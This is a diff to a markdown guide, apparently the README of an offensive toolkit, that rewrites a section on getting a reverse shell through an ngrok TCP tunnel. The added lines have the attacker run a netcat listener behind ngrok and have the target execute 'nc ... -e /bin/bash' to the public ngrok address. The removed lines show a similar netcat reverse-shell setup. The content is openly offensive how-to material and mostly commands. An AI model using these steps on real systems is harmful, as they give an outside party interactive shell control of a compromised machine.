@@ -311,22 +311,17 @@ Requirement:
 
 ### Via a tcp tunnel
 
-On the target launch a reverse shell the way you prefer, for example:
+On the attacker machine laucnh your netcat listener with a ngrok tunnel above:
 ```shell
-nc 127.0.0.1 4444 -e /bin/bash #does need sudo privilege
+bang.expose.netcat.listener [port]
+# launch ngrok in background, print the tunnel addr, and launch netcat lister
 ```
 
-Now initiate the tcp tunnel between the target machine and the world wide web:
+On the target you know have to perform a reverse shell to the public ngrok addr:
 ```shell
-ngrok tcp 4444
+nc [ngrok_adrr] [ngrok_port] -e /bin/bash    #example with nc, could be another option
 ```
-This line can be copy to the clipboard from attacker machine with `bang.expose.tcp.cpy`
-
-Ngrok will give you an address to join to access the tunnel. Connect to the reverse shell as follow from the attacker machine:
-```shell
-nc [ngrok_addr] [ngrok_port]
-# And enjoy!
-```
+*Note: a less convenient way is to launch ngrok on target, then netcat listener on attacker, on netcat reverse shell to `localhost` on target (need nrok on target)*
 
 ### Via webshell
 
